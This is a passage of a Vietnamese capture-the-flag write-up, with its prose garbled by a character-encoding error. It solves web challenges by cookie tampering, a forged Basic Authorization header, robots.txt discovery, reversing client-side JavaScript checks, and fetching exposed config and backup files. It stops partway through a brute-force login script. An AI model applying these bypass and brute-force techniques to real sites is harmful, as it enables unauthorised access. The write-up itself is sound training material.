<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{n0_pr0b_w1th_cub3_r00t_RIGHT?}</code></p>

<h1 id="web-basic">WEB BASIC</h1>

<h2 id="h√¢n-hoan">H√¢n hoan</h2>
<blockquote>
  <p>Th·∫•y h·ªôp b√°nh quy c·ªßa ch√∫ Hazy ƒë·ªÉ h·ªõ h√™nh tr√™n b√†n. V·ªõi b·∫£n t√≠nh ngh·ªãch ng·ª£m, M√®o Yang H·ªì nhanh tay th√™m ch√∫t gia v·ªã ƒë·ªÉ bi·∫øn cu·ªôc ƒë·ªùi tr·ªü n√™n h√†i h∆∞·ªõc v√† h√¢n hoan h∆°n.</p>

  <p>http://chal5.web.letspentest.org/</p>
</blockquote>

<p>ƒê·ªçc qua ƒë·ªÅ b√†i th√¨ m√¨nh th·∫•y t·ª´ <code class="language-plaintext highlighter-rouge">b√°nh quy</code> n√™n nghƒ© ngay t·ªõi <code class="language-plaintext highlighter-rouge">cookie</code>. Khi b·∫•m v√†o link challenge th√¨ th·∫•y c√≥ m·ªôt form ƒëƒÉng nh·∫≠p.</p>

<p>M√¨nh th·ª≠ ƒëƒÉng nh·∫≠p b·∫±ng <code class="language-plaintext highlighter-rouge">username=un</code> v√† <code class="language-plaintext highlighter-rouge">passoword=pw</code> (gi√° tr·ªã b·∫•t k√¨) th√¨ th·∫•y xu·∫•t hi·ªán nh∆∞ sau:</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/han_hoan_1.png" alt="" /></p>

<p>B√¢y gi·ªù th√¨ l·∫°i auto F12 ƒë·∫øn tab cookie th√¥i n√†o.</p>

<p>M·∫∑c ƒë·ªãnh th√¨ ta s·∫Ω th·∫•y Role c√≥ gi√° tr·ªã m·∫∑c ƒë·ªãnh l√† Guest, hmmmm, trang web b·∫£o ‚ÄúYou‚Äôre not CookieHanHoan!‚Äù n√™n c√≥ th·ªÉ ta s·∫Ω ƒë·ªïi gi√° tr·ªã Role th√†nh ‚ÄúCookieHanHoan‚Äù chƒÉng?</p>

<p>Oce th·ª≠ ƒë·ªïi v√† refresh trang web th√¨ c√≥ lu√¥n flag.</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Cookies_Yummy_Cookies_Yammy!}</code></p>

<h2 id="header-401">Header 401</h2>
<blockquote>
  <p>ƒê·ªÉ nhi·ªÅu lo·∫°i Tr√¨nh duy·ªát v√† Web Server c√≥ th·ªÉ n√≥i chuy·ªán v√† hi·ªÉu ƒë∆∞·ª£c nhau th√¨ h·ªç ph·∫£i s·ª≠ d·ª•ng chung m·ªôt giao th·ª©c c√≥ t√™n g·ªçi l√† HTTP Protocol. Khi ng∆∞·ªùi d√πng b·∫Øt ƒë·∫ßu truy c·∫≠p Web, tr√¨nh duy·ªát s·∫Ω chuy·ªÉn nh·ªØng h√†nh ƒë·ªông c·ªßa h·ªç th√†nh y√™u c·∫ßu (Request) t·ªõi Web Server. C√≤n Web Server s·∫Ω tr·∫£ l·ªùi (Response) xem c√≥ th·ªÉ ƒë√°p ·ª©ng hay t·ª´ ch·ªëi cung c·∫•p th√¥ng tin cho tr√¨nh duy·ªát.</p>

  <p>V√≠ d·ª•, b·∫°n G√† mu·ªën L·∫§Y danh s√°ch c√°c th·ª≠ th√°ch trong cookiearena<ch·∫•m>org, ·ªü ƒë∆∞·ªùng d·∫´n /challenges b·∫±ng TR√åNH DUY·ªÜT Chrome. Tr√¨nh duy·ªát c·ªßa G√† s·∫Ω ph·∫£i ƒëi·ªÅn v√†o m·ªôt c√°i form m·∫´u c√≥ t√™n g·ªçi l√† HTTP Header v√† g·ª≠i ƒëi. M·ªói y√™u c·∫ßu s·∫Ω ƒë∆∞·ª£c vi·∫øt tr√™n m·ªôt d√≤ng, v√† n·ªôi dung c·ªßa m·ªói y√™u c·∫ßu s·∫Ω ph·∫£i vi·∫øt ƒë·∫±ng sau d·∫•u hai ch·∫•m.</ch·∫•m></p>

  <p>H√£y ƒëo√°n xem trong th·ª≠ th√°ch n√†y c√≥ nh·ªØng Header th√∫ v·ªã n√†o nha</p>

  <p>http://chal3.web.letspentest.org/</p>
</blockquote>

<p>ƒê·ªçc ƒë·ªÅ b√†i m√¨nh ch√∫ √Ω c√°c t·ª´ kho√° nh∆∞ <code class="language-plaintext highlighter-rouge">HTTP Header</code>, <code class="language-plaintext highlighter-rouge">HTTP Request</code>, <code class="language-plaintext highlighter-rouge">HTTP Response</code>, t·ª´ <code class="language-plaintext highlighter-rouge">L·∫§Y</code> ƒë∆∞·ª£c vi·∫øt in hoa nh·∫±m √°m ch·ªâ <code class="language-plaintext highlighter-rouge">GET</code> method. T·ªõi ƒë√¢y m√¨nh d·ª± ƒëo√°n s·∫Ω th·ª≠ thay ƒë·ªïi method, HTTP Header, g·ª≠i request v√† quan s√°t response.</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_1.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">Hello GET Request</code>, √°m ch·ªâ m√¨nh th·ª≠ ƒë·ªïi th√†nh method kh√°c. B·∫≠t Burp Suite v√† th·ª≠ n√†o.</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_2.png" alt="" /></p>

<p>Hella s√∫ ngl. C·ª© note l·∫°i ƒë√£ <code class="language-plaintext highlighter-rouge">Basic Authentication Credential: gaconlonton/cookiehanhoan</code></p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_3.png" alt="" /></p>

<p>Chuy·ªÉn sang tab Repeater, chuy·ªÉn method t·ª´ GET th√†nh POST, b·∫•m send th√¨ server b√°o <code class="language-plaintext highlighter-rouge">Missing Basic Authorization Header.</code>.</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_4.png" alt="" /></p>

<p>Ch√∫ng ta d√πng th√¥ng tin <code class="language-plaintext highlighter-rouge">Basic Authentication Credential: gaconlonton/cookiehanhoan</code> ƒë·ªÉ th√™m header <code class="language-plaintext highlighter-rouge">Authorization: Basic Z2Fjb25sb250b246Y29va2llaGFuaG9hbg==</code>. B·∫•m send v√† nh·∫≠n flag, ez win ehh.</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_5.png" alt="" /></p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{m4g1c@l_h34d3r_xD}</code></p>

<h2 id="i-am-not-a-robot">I am not a robot</h2>
<blockquote>
  <p>N·∫øu l√† ng∆∞·ªùi th√¨ cho xem tai, c√≤n n·∫øu l√† robot th√¨ ƒë·ª©ng ·ªü ngo√†i. B·∫°n ƒë√£ b·ªã ch·∫∑n.</p>

  <p>http://chal2.web.letspentest.org/</p>
</blockquote>

<p>ƒê·ªÅ b√†i qu√° quen thu·ªôc r·ªìi nh·ªâ? Ta v√†o xem <code class="language-plaintext highlighter-rouge">robots.txt</code> lu√¥n.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://chal2.web.letspentest.org/robots.txt
-----------------------------------------------------
User-agent: Googlebot
Disallow: /nogooglebot/

User-agent: *
Allow: /fl@g1337_d240c789f29416e11a3084a7b50fade5.txt

Sitemap: http://www.example.com/sitemap.xml
</code></pre></div></div>

<p>T·∫°i ƒë√¢y ta th·∫•y path <code class="language-plaintext highlighter-rouge">/fl@g1337_d240c789f29416e11a3084a7b50fade5.txt</code> r·∫•t ƒë√°ng nghi n√™n ta v√†o xem lu√¥n.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://chal2.web.letspentest.org/fl@g1337_d240c789f29416e11a3084a7b50fade5.txt
-----------------------------------------------------
Flag{N0_B0T_@ll0w}
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{N0_B0T_@ll0w}</code></p>

<h2 id="impossible">Impossible</h2>
<blockquote>
  <p>H·ªçc l·ªèm ƒë∆∞·ª£c c√¥ng th·ª©c ch·∫ø t·∫°o l√° ch·∫Øn t√†ng h√¨nh c·ªßa Hazy. G√† nhanh ch√≥ng ƒëem v·ªÅ x√¢y d·ª±ng h·ªá th·ªëng ph√≤ng th·ªß c·ªßa ri√™ng m√¨nh. Li·ªáu n√≥ c√≥ l√†m kh√≥ ƒë∆∞·ª£c M√®o Yang H·ªì kh√¥ng?</p>

  <p>http://chal7.web.letspentest.org/</p>
</blockquote>

<p>Trang web cho ta m·ªôt khung nh·∫≠p m·∫≠t kh·∫©u, ngay khi inspect th√¨ ta th·∫•y lu√¥n source code x·ª≠ l√Ω d·ªØ li·ªáu m√† ta nh·∫≠p v√†o.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">function</span> <span class="nx">checkPass</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">password</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">password</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">cookiehanhoan</span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">))</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">Y29va2llaGFuaG9hbg==</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
		<span class="nb">window</span><span class="p">.</span><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
			<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="dl">'</span><span class="s1">check.php?password=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">password</span><span class="p">);</span>
		<span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>·ªû ƒë√¢y h√†m <code class="language-plaintext highlighter-rouge">btoa</code> c√≥ t√°c d·ª•ng chuy·ªÉn sang base64, ng∆∞·ª£c l·∫°i v·ªõi <code class="language-plaintext highlighter-rouge">btoa</code> l√† <code class="language-plaintext highlighter-rouge">atob</code>. Ta bi·∫øn ƒë·ªïi bi·ªÉu th·ª©c:</p>

<p><code class="language-plaintext highlighter-rouge">btoa(password.replace("cookiehanhoan", "")) == "Y29va2llaGFuaG9hbg=="</code></p>

<p>=&gt; <code class="language-plaintext highlighter-rouge">atob(btoa(password.replace("cookiehanhoan", ""))) == atob("Y29va2llaGFuaG9hbg==")</code></p>

<p>=&gt; <code class="language-plaintext highlighter-rouge">password.replace("cookiehanhoan", "") == "cookiehanhoan"</code>. (<code class="language-plaintext highlighter-rouge">atob("Y29va2llaGFuaG9hbg==")</code> ch√≠nh l√† <code class="language-plaintext highlighter-rouge">"cookiehanhoan"</code>)</p>

<p>T·ª©c l√† m·∫≠t kh·∫©u c·ªßa ch√∫ng ta sau khi b·ªè <code class="language-plaintext highlighter-rouge">"cookiehanhoan"</code> ph·∫£i l√† <code class="language-plaintext highlighter-rouge">"cookiehanhoan"</code>???</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Impossible_1.png" alt="" /></p>

<p>Heh, kh√¥ng sao, ch√∫ng ta v·∫´n c√≥ c√°ch: c<strong>cookiehanhoan</strong>ookiehanhoan. Ph·∫ßn im ƒë·∫≠m s·∫Ω ƒë∆∞·ª£c l∆∞·ª£c b·ªè v√† ta nh·∫≠n ƒë∆∞·ª£c <code class="language-plaintext highlighter-rouge">"cookiehanhoan"</code></p>

<p>Submit v√† nh·∫≠p flag n√†o hehe.</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Javascript_is_not_safe???}</code></p>

<h2 id="infinity-loop">Infinity Loop</h2>
<blockquote>
  <p>Cu·ªôc ƒë·ªùi lu√¥n l√† v·∫≠y. M·ªôt gi√¢y tr∆∞·ªõc t∆∞·ªüng ƒë√£ c√πng ƒë∆∞·ªùng, m·ªôt gi√¢y sau c√≥ l·∫°i ƒë·∫ßy hy v·ªçng. C√°c chi·∫øn binh ƒë√£ c√≥ c√¥ng c·ª• m·∫°nh m·∫Ω trong tay, h√£y d√πng n√≥ ƒë·ªÉ can thi·ªáp d√≤ng ch·∫£y.</p>

  <p>http://chal6.web.letspentest.org/</p>
</blockquote>

<p>ƒê·ªçc ƒë·ªÅ th√¨ m√¨nh nghƒ© ngay t·ªõi Burp Suite.</p>

<p>Trang web l·∫°i cho ta m·ªôt form ƒë·ªÉ nh·∫≠p password v√† username, qu√° nhi·ªÅu form ƒëƒÉng nh·∫≠p cho cu·ªôc s·ªëng :(</p>

<p>M√¨nh nh·∫≠p th·ª≠ <code class="language-plaintext highlighter-rouge">username = ok</code>, <code class="language-plaintext highlighter-rouge">password = ok</code> r·ªìi enter th√¨ n√≥ hi·ªán trang web l·ªói</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_1.png" alt="" /></p>

<p>Th·∫≠m ch√≠, m·ªói l·∫ßn refresh th√¨ l·∫°i xu·∫•t hi·ªán <code class="language-plaintext highlighter-rouge">id</code> kh√°c, n√™n m√¨nh quy·∫øt ƒë·ªãnh b·∫≠t Burp Suite l√™n xem th·ª≠.</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_2.png" alt="" /></p>

<p>Hm‚Ä¶ C√≥ v·∫ª nh∆∞ n√≥ redirect li√™n t·ª•c r·ªìi d·ª´ng.</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_3.png" alt="" /></p>

<p>Redirect nhi·ªÅu l·∫ßn th·∫≠t ƒë·∫•y nh∆∞ng sao kh√¥ng c√≥ <code class="language-plaintext highlighter-rouge">id = 6</code> =)) Chuy·ªÉn sang Repeater r·ªìi s·ª≠a <code class="language-plaintext highlighter-rouge">id = 6</code> l√† t√¨m th·∫•y flag r·ªìi.</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_4.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_5.png" alt="" /></p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Y0u_c4ptur3_m3_xD!!!}</code></p>

<h2 id="js-bp-bp">JS B**p B**p</h2>
<blockquote>
  <p>Sau nhi·ªÅu ƒë√™m suy nghƒ© v·ªÅ vi·ªác l√†m th·∫ø n√†o ƒë·ªÉ b·∫£o v·ªá m√£ ngu·ªìn. C·ªë g·∫Øng tho√°t kh·ªèi √°nh m·∫Øt soi m√≥i c·ªßa M√®o Yang H·ªì.</p>

  <p>G√† ch·∫πp mi·ªáng r·ªìi n√≥i: ‚Äúƒê√£ t·ªõi l√∫c ph·∫£i cho n√≥ ph·∫£i th·ªët l√™n r·∫±ng! WTF!!!‚Äù</p>

  <p>http://chal4.web.letspentest.org/</p>
</blockquote>

<p>Trang web cho 3 m·ª•c nh·∫≠p User, Pass v√† Role, quen qu√° nh·ªâ, th√¥i l·∫°i F12 th√¥i =))</p>

<p>Sau khi ƒë·ªçc source code th√¨ m√¨nh th·∫•y h√†m <code class="language-plaintext highlighter-rouge">verifyUsername</code>, <code class="language-plaintext highlighter-rouge">verifyPassword</code> v√† <code class="language-plaintext highlighter-rouge">verifyRole</code> c·∫ßn return true v√† kh√° ch·∫Øc 3 h√†m n√†y ·ªü trong 4 file js (1.js, 2.js, 3.js, 4.js) trong web.</p>

<p>B·∫•m v√¥ th√¨ l√≤i ra c√° ƒë·ªëng JSF*ck @@</p>

<p>M√¨nh s·∫Ω d√πng tool <a href="https://enkhee-osiris.github.io/Decoder-JSFuck/">n√†y</a> ƒë·ªÉ decode JSF*ck. Tick ch·ªçn √¥ eval r·ªìi d√°n v√†o r·ªìi b·∫•m decode l√† ra th√¥i ü§°</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1.js</span>
<span class="kd">function</span> <span class="nx">verifyUsername</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">cookiehanhoan</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// 2.js</span>
<span class="kd">function</span> <span class="nx">reverseString</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">str</span> <span class="o">===</span> <span class="dl">''</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="dl">''</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">return</span> <span class="nx">reverseString</span><span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="nx">str</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="c1">// 3.js</span>
<span class="kd">function</span> <span class="nx">verifyPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">reverseString</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">dr0Wss@p3rucreSr3pus</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// 4.js</span>
<span class="kd">function</span> <span class="nx">verifyRole</span><span class="p">(</span><span class="nx">role</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">209</span> <span class="o">&amp;&amp;</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">9</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">3</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">10578</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="nx">role</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">27</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>H√†m <code class="language-plaintext highlighter-rouge">verifyUsername</code> th√¨ ch·ªâ ki·ªÉm tra <code class="language-plaintext highlighter-rouge">username</code> c√≥ ph·∫£i l√† <code class="language-plaintext highlighter-rouge">cookiehanhoan</code> hay kh√¥ng.</p>

<p>C√≤n h√†m <code class="language-plaintext highlighter-rouge">reverseString</code> th√¨ d√πng ƒë·ªÉ reverse string (V√≠ d·ª•: ‚Äòabc‚Äô -&gt; ‚Äòcba‚Äô).</p>

<p>H√†m <code class="language-plaintext highlighter-rouge">verifyPassword</code> th√¨ ki·ªÉm tra xem chu·ªói password ch√∫ng ta nh·∫≠p v√†o c√≥ ph·∫£i l√† ƒë·∫£o ng∆∞·ª£c c·ªßa <code class="language-plaintext highlighter-rouge">dr0Wss@p3rucreSr3pus</code> kh√¥ng, t·ª©c l√† password c√≥ b·∫±ng <code class="language-plaintext highlighter-rouge">sup3rSercur3p@ssW0rd</code> kh√¥ng.</p>

<p>Cu·ªëi c√πng l√† h√†m <code class="language-plaintext highlighter-rouge">verifyRole</code>. Ch·ªØ c√°i ƒë·∫ßu ti√™n c·ªßa role c√≥ gi√° tr·ªã ASCII l√† 64 - ch√≠nh l√† k√≠ t·ª± @. Ti·∫øp theo, ch√∫ng ta t√¨m 2 k√≠ t·ª± ti·∫øp theo c√≥ t·ªïng v√† hi·ªáu theo b·∫£ng m√£ ASCII l√† 209 v√† 9 - ch√≠nh l√† 100 (d) v√† 109 (m). Ti·∫øp theo khi n·ªëi gi√° tr·ªã ASCII c·ªßa 2 k√≠ t·ª± ti·∫øp theo th√¨ s·∫Ω ra gi√° tr·ªã <code class="language-plaintext highlighter-rouge">'10578'</code> v√† hi·ªáu 2 gi√° tr·ªã ƒë√≥ b·∫±ng 27 - 105 (i) v√† (N).</p>

<p>K·∫øt n·ªëi nh·ªØng ƒëi·ªÅu tr√™n, ta ch·ªâ c·∫ßn nh·∫≠p <code class="language-plaintext highlighter-rouge">username = 'cookiehanhoan'</code>, <code class="language-plaintext highlighter-rouge">password = 'sup3rSercur3p@ssW0rd'</code> v√† <code class="language-plaintext highlighter-rouge">role</code> l√† x√¢u b·∫•t k√¨ c√≥ 5 k√≠ t·ª± ƒë·∫ßu l√† <code class="language-plaintext highlighter-rouge">@dmiN</code> - v√≠ d·ª• nh∆∞ <code class="language-plaintext highlighter-rouge">@dmiNhehe</code> hay <code class="language-plaintext highlighter-rouge">@dmiN</code> ƒë·ªÅu ƒë∆∞·ª£c. Sau ƒë√≥ b·∫•m submit th√¥i. =))</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{JAV-ascript_F*ck}</code></p>

<h1 id="web-exploitation">WEB EXPLOITATION</h1>

<h2 id="misconfiguration">Misconfiguration</h2>
<blockquote>
  <p>Ch·∫≥ng bi·∫øt v√¥ t√¨nh hay c·ªë √Ω, G√† m·∫Øc ph·∫£i m·ªôt sai l·∫ßm kh√¥ng ƒë√°ng c√≥ trong vi·ªác thi·∫øt l·∫≠p c·∫•u h√¨nh Web Server.</p>

  <p>T·ª´ m·ªôt l·ªó h·ªïng nh·ªè t√≠ x√≠u, M√®o Yang H·ªì s·∫Ω t·∫≠n d·ª•ng m·ªçi tr√≠ t∆∞·ªüng t∆∞·ª£ng v√† kƒ© thu·∫≠t ƒë·ªÉ th√¢m nh·∫≠p ƒë∆∞·ª£c s√¢u h∆°n.</p>

  <p>http://chal16.web.letspentest.org/</p>
</blockquote>

<p>Khi vi·∫øt writeup b√†i n√†y th√¨ web ƒë√£ s·∫≠p n√™n kh√¥ng c√≥ ·∫£nh minh ho·∫° ƒë∆∞·ª£c üò•</p>

<p>Khi ƒë·ªçc ƒë·ªÅ th√¨ m√¨nh nghƒ© t·ªõi vi·ªác t√¨m c√°c file <code class="language-plaintext highlighter-rouge">config</code>. M√¨nh ch·ªâ bi·∫øt <code class="language-plaintext highlighter-rouge">/.htaccess</code> c·ªßa Apache th√¥i :v. R·ªìi m√¨nh d√πng dirsearch th√¨ c√≥ th√™m <code class="language-plaintext highlighter-rouge">/web.config</code>.</p>

<p>Flag c√≥ 3 ph·∫ßn:</p>
<ul>
  <li>Part 1: <code class="language-plaintext highlighter-rouge">http://chal16.web.letspentest.org/.htaccess</code></li>
  <li>Part 2: <code class="language-plaintext highlighter-rouge">http://chal16.web.letspentest.org/web.config</code></li>
  <li>Part 3: ·ªû trong <code class="language-plaintext highlighter-rouge">/web.config</code> th√¨ c√≥ ƒë∆∞·ªùng d·∫´n ƒë·ªÉ t·∫£i m·ªôt file <code class="language-plaintext highlighter-rouge">.bak</code>, t·∫£i v·ªÅ d√πng l·ªánh <code class="language-plaintext highlighter-rouge">file</code> th√¨ bi·∫øt n√≥ l√† file zip. M√¨nh ƒë·ªïi ph·∫ßn m·ªü r·ªông th√†nh <code class="language-plaintext highlighter-rouge">.zip</code>, gi·∫£i n√©n ra v√† nh·∫≠n part 3.</li>
</ul>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{1b283f0725d536a0f217d89caca7b183}</code></p>

<h2 id="gatling-gun">Gatling gun</h2>
<blockquote>
  <p>V·ªõi chi·∫øc Gatling gun m·∫°nh m·∫Ω trong tay, M√®o Yang H·ªì c√≥ th·ªÉ v∆∞·ª£t qua b·∫•t k√¨ c√°nh c·ª≠a b·∫£o m·∫≠t n√†o. Nh∆∞ng th·∫≠t bu·ªìn c∆∞·ªùi l√† trong tay h·∫Øn l·∫°i kh√¥ng c√≥ m·ªôt vi√™n ƒë·∫°n n√†o.</p>

  <p>N·∫øu b·∫°n mu·ªën ngh·ªãch s√∫ng v·ªõi M√®o th√¨ h√£y ƒëi nh·∫∑t ƒë·∫°n ·ªü trong Github c·ªßa Cookie H√¢n Hoan nh√©.</p>

  <p>http://chal9.web.letspentest.org/</p>
</blockquote>

<p>V·ª´a b·∫•m v√†o link, m√¨nh nh·∫≠n ƒë∆∞·ª£c m·ªôt c√°i giao di·ªán nh∆∞ n√†y, c√πng v·ªõi m√¥ t·∫£ trong ƒë·ªÅ l√† ‚Äúgatling gun‚Äù, ‚Äúb·∫Øn s√∫ng‚Äù v√† l√™n github ƒë·ªÉ ‚Äúnh·∫∑t ƒë·∫°n‚Äù, m√¨nh ƒëo√°n ƒë√¢y ch√≠nh l√† m·ªôt chall v·ªÅ bruteforce login:</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/gatling_gun_1.png" alt="" /></p>

<p>M√¨nh m·ªü github c·ªßa Cookien H√¢n Hoan l√™n th√¨ th·∫•y m·ªôt s·ªë file gi·ªëng nh∆∞ l√† account ƒë·ªÉ ƒëƒÉng nh·∫≠p:</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/gatling_gun_2.png" alt="" /></p>

<p>ƒê·∫øn ƒë√¢y th√¨ c√≥ th·ªÉ s·ª≠ d·ª•ng BurpSuite ƒë·ªÉ brute nh∆∞ng kh√¥ng, <code class="language-plaintext highlighter-rouge">ng∆∞·ªùi th√†nh c√¥ng c√≥ l·ªëi ƒëi ri√™ng ‚ú®</code></p>

<p>M√¨nh download c√°c file ƒë√≥ v·ªÅ v√† m√¨nh t·ª± ch·∫ø m·ªôt kh·∫©u gatling gun b·∫±ng kƒ© nƒÉng c∆° kh√≠ <del>vjp pro</del> c·ªßa m√¨nh. Sau m·ªôt l√∫c m√¨nh ƒë√£ c√≥ ƒë∆∞·ª£c m·ªôt kh·∫©u galting gun kh√° l√† h·∫°t d·∫ª:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">'http://chal9.web.letspentest.org/login'</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'ip.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">ips</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'userLame.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">users</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'pa$$w0rd.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
